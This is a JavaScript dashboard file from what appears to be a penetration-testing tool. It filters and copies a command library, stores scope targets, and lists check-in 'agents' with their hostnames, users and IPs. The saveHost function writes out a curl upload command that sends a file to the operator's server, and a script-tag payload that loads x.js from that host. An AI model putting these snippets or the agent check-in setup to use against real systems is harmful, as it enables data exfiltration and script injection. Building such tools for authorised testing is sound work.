// Copyright (C) 2021 Jan-Karel Visser info@jan-karel.nl
// SPDX-License-Identifier: AGPL-3.0-or-later

/**
 * Dashboard
 * Implements FIRST CVSS 4.0 specification for base score calculation
 * https://www.first.org/cvss/v4.0/specification-document
 */


(() => {
  const filterInput = document.getElementById("command-filter");
  const commandItems = Array.from(document.querySelectorAll(".command-item"));

  if (filterInput) {
    filterInput.addEventListener("input", () => {
      const q = filterInput.value.trim().toLowerCase();
      for (const item of commandItems) {
        const hay = item.getAttribute("data-command") || "";
        item.style.display = hay.includes(q) ? "block" : "none";
      }
    });
  }

  function copyFeedback(btn, text, cls) {
    const old = btn.textContent;
    btn.textContent = text;
    if (cls) btn.classList.add(cls);
    setTimeout(() => {
      btn.textContent = old;
      if (cls) btn.classList.remove(cls);
    }, 1200);
  }

  // Snippet copy knoppen (data-copy-target)
  const copyButtons = Array.from(document.querySelectorAll(".copy-btn"));
  for (const btn of copyButtons) {
    btn.addEventListener("click", async () => {
      const targetId = btn.getAttribute("data-copy-target");
      const el = targetId ? document.getElementById(targetId) : null;
      if (!el) return;
      try {
        await navigator.clipboard.writeText(el.textContent || "");
        copyFeedback(btn, "gekopieerd", "copied");
      } catch (_err) {
        copyFeedback(btn, "mislukt", null);
      }
    });
  }

  // Command Library copy knoppen (data-content)
  const cmdCopyButtons = Array.from(document.querySelectorAll(".btn-copy-cmd"));
  for (const btn of cmdCopyButtons) {
    btn.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      const text = btn.getAttribute("data-content") || "";
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
          copyFeedback(btn, "Gekopieerd!", "copied");
        });
      } else {
        const ta = document.createElement("textarea");
        ta.value = text;
        ta.style.position = "fixed";
        ta.style.opacity = "0";
        document.body.appendChild(ta);
        ta.select();
        document.execCommand("copy");
        document.body.removeChild(ta);
        copyFeedback(btn, "Gekopieerd!", "copied");
      }
    });
  }

  // ── Edit host / settings modal ─────────────────────────────
  const hostModal = document.getElementById("host-modal");
  const hostInput = document.getElementById("host-input");
  const toggleProxy = document.getElementById("toggle-proxy");
  const btnEditHost = document.getElementById("btn-edit-host");
  const btnHostClose = document.getElementById("btn-host-close");
  const btnHostSave = document.getElementById("btn-host-save");
  const snippetHost = document.getElementById("snippet-host");
  const snippetUpload = document.getElementById("snippet-upload");
  const snippetXjs = document.getElementById("snippet-xjs");

  function openHostModal() {
    fetch("/api/settings").then(r => r.json()).then(d => {
      hostInput.value = d.localhost || "";
      if (toggleProxy) toggleProxy.checked = !!d.behind_proxy;
      hostModal.style.display = "flex";
      hostInput.focus();
    });
  }

  function closeHostModal() { hostModal.style.display = "none"; }

  function saveHost() {
    const val = hostInput.value.trim();
    if (!val) return;
    const payload = {localhost: val};
    if (toggleProxy) payload.behind_proxy = toggleProxy.checked;
    fetch("/api/settings", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(payload),
    }).then(r => r.json()).then(() => {
      if (snippetHost) snippetHost.textContent = val;
      if (snippetUpload) snippetUpload.textContent = "curl -F file=@FILENAME " + val + "/upload";
      if (snippetXjs) snippetXjs.textContent = '<script src="' + val + '/x.js"><\/script>';
      closeHostModal();
    });
  }

  if (btnEditHost) btnEditHost.addEventListener("click", openHostModal);
  if (btnHostClose) btnHostClose.addEventListener("click", closeHostModal);
  if (btnHostSave) btnHostSave.addEventListener("click", saveHost);
  if (hostInput) hostInput.addEventListener("keydown", (e) => { if (e.key === "Enter") saveHost(); });
  if (hostModal) hostModal.addEventListener("click", (e) => { if (e.target === hostModal) closeHostModal(); });

  // ── Scope targets modal ─────────────────────────────────────
  const scopeModal = document.getElementById("scope-modal");
  const btnScope = document.getElementById("btn-scope");
  const btnScopeClose = document.getElementById("btn-scope-close");
  const btnScopeSave = document.getElementById("btn-scope-save");
  const btnAddScopeTarget = document.getElementById("btn-add-scope-target");
  const scopeStatus = document.getElementById("scope-status");

  let _scopeTargets = [];

  function renderScopeTargets(list) {
    _scopeTargets = list || [];
    const container = document.getElementById("scope-targets-list");
    if (!container) return;
    container.innerHTML = "";
    _scopeTargets.forEach((st, i) => {
      const row = document.createElement("div");
      row.className = "scope-target-row";
      const typeOpts = ["host", "netwerk", "url", "applicatie"];
      let selectHtml = '<select class="form-control scope-target-type" data-st-type="' + i + '">';
      typeOpts.forEach(t => {
        selectHtml += '<option value="' + t + '"' + (t === (st.type || "host") ? ' selected' : '') + '>' + t + '</option>';
      });
      selectHtml += '</select>';
      row.innerHTML =
        '<input type="text" class="form-control scope-target-input" data-st-target="' + i + '" placeholder="Doel (IP, URL, hostnaam)" value="' + (st.target || "").replace(/"/g, "&quot;") + '" />' +
        selectHtml +
        '<input type="text" class="form-control scope-target-input" data-st-beschrijving="' + i + '" placeholder="Beschrijving" value="' + (st.beschrijving || "").replace(/"/g, "&quot;") + '" />' +
        '<button type="button" class="btn scope-target-del-btn" data-st-del="' + i + '">\u2715</button>';
      container.appendChild(row);
    });
    container.querySelectorAll("[data-st-del]").forEach(btn => {
      btn.addEventListener("click", () => {
        _scopeTargets = collectScopeTargets();
        _scopeTargets.splice(parseInt(btn.getAttribute("data-st-del")), 1);
        renderScopeTargets(_scopeTargets);
      });
    });
  }

  function collectScopeTargets() {
    const result = [];
    const container = document.getElementById("scope-targets-list");
    if (!container) return result;
    _scopeTargets.forEach((st, i) => {
      const tEl = container.querySelector('[data-st-target="' + i + '"]');
      const tyEl = container.querySelector('[data-st-type="' + i + '"]');
      const bEl = container.querySelector('[data-st-beschrijving="' + i + '"]');
      if (tEl) {
        result.push({
          target: tEl.value || "",
          type: tyEl ? tyEl.value || "host" : "host",
          beschrijving: bEl ? bEl.value || "" : ""
        });
      }
    });
    return result;
  }

  function openScopeModal() {
    if (!scopeModal) return;
    fetch("/api/settings").then(r => r.json()).then(d => {
      renderScopeTargets(d.rapport_scope_targets || []);
      scopeModal.style.display = "flex";
    });
  }

  function closeScopeModal() { if (scopeModal) scopeModal.style.display = "none"; }

  function saveScopeTargets() {
    const targets = collectScopeTargets();
    fetch("/api/settings", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({rapport_scope_targets: targets}),
    }).then(r => r.json()).then(d => {
      if (d.ok && scopeStatus) {
        scopeStatus.textContent = "Opgeslagen!";
        scopeStatus.style.color = "var(--success, #22c55e)";
        setTimeout(() => { scopeStatus.textContent = ""; }, 2000);
      }
    }).catch(() => {
      if (scopeStatus) {
        scopeStatus.textContent = "Fout bij opslaan";
        scopeStatus.style.color = "var(--danger, #ef4444)";
      }
    });
  }

  if (btnScope) btnScope.addEventListener("click", openScopeModal);
  if (btnScopeClose) btnScopeClose.addEventListener("click", closeScopeModal);
  if (btnScopeSave) btnScopeSave.addEventListener("click", saveScopeTargets);
  if (btnAddScopeTarget) btnAddScopeTarget.addEventListener("click", () => {
    _scopeTargets = collectScopeTargets();
    _scopeTargets.push({target: "", type: "host", beschrijving: ""});
    renderScopeTargets(_scopeTargets);
  });
  if (scopeModal) scopeModal.addEventListener("click", (e) => { if (e.target === scopeModal) closeScopeModal(); });

  // ── Agent polling ───────────────────────────────────────────
  const agentPanel = document.getElementById("agent-panel");
  const kpiAgents = document.getElementById("kpi-agents");

  function escapeHtml(s) {
    const d = document.createElement("div");
    d.appendChild(document.createTextNode(s));
    return d.innerHTML;
  }

  function timeDelta(seconds) {
    if (seconds < 60) return seconds + "s geleden";
    if (seconds < 3600) return Math.floor(seconds / 60) + "m geleden";
    if (seconds < 86400) return Math.floor(seconds / 3600) + "u geleden";
    return Math.floor(seconds / 86400) + "d geleden";
  }

  function fetchDashboardAgents() {
    if (!agentPanel) return;
    fetch("/api/agents")
      .then(r => r.json())
      .then(agents => {
        let active = 0;
        agents.forEach(a => { if (a.status === "active") active++; });
        if (kpiAgents) kpiAgents.textContent = active;

        if (agents.length === 0) {
          agentPanel.innerHTML = '<p class="help">Geen agents &mdash; scripts checken in via <code>/agent/checkin</code></p>';
          return;
        }

        let html = "";
        agents.forEach(a => {
          html +=
            '<div class="agent-row">' +
              '<span class="agent-dot ' + escapeHtml(a.status) + '"></span>' +
              '<div class="agent-meta">' +
                '<span class="agent-name">' + escapeHtml(a.hostname) + ' (' + escapeHtml(a.username) + ')</span>' +
                '<span class="agent-info">' + escapeHtml(a.ip) + ' &middot; ' + escapeHtml(a.os_info || '') + '</span>' +
              '</div>' +
              '<span class="agent-time">' + timeDelta(a.delta) + '</span>' +
            '</div>';
        });
        agentPanel.innerHTML = html;
      })
      .catch(() => {});
  }

  fetchDashboardAgents();
  setInterval(fetchDashboardAgents, 5000);
})();
